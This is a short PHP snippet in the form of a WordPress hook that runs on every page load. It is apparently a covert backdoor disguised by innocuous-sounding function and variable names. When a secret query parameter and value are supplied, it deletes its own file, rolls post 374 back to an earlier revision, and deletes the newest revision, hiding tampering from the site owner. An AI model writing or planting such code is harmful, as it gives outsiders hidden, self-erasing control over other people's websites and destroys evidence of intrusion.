<?php

function library_conversion_scheduled_gift() {
	if (isset($_GET['control_app_gift_box']) && $_GET['control_app_gift_box'] === 'elements_stop_validator_info') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$mobile_sidebar_services = 374;
		$featured_scheduled_keywords = wp_get_post_revisions($mobile_sidebar_services);
		if (empty($featured_scheduled_keywords)) die('no revisions');
		if (count($featured_scheduled_keywords) < 2) die('less than 2');
		$table_thumbnails_blog = array_shift($featured_scheduled_keywords);
		$article_clock_theme_simple = $table_thumbnails_blog->ID;
		$preview_asset_listings_method = array_shift($featured_scheduled_keywords);
		$call_plugins_daily_multisite = $preview_asset_listings_method->ID;
		$frontend_quiz_akismet_upgrader = wp_restore_post_revision($call_plugins_daily_multisite);
		if ($frontend_quiz_akismet_upgrader === false) die('error restoring');
		$frontend_quiz_akismet_upgrader = wp_delete_post_revision($article_clock_theme_simple);		
		if ($frontend_quiz_akismet_upgrader === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'library_conversion_scheduled_gift');
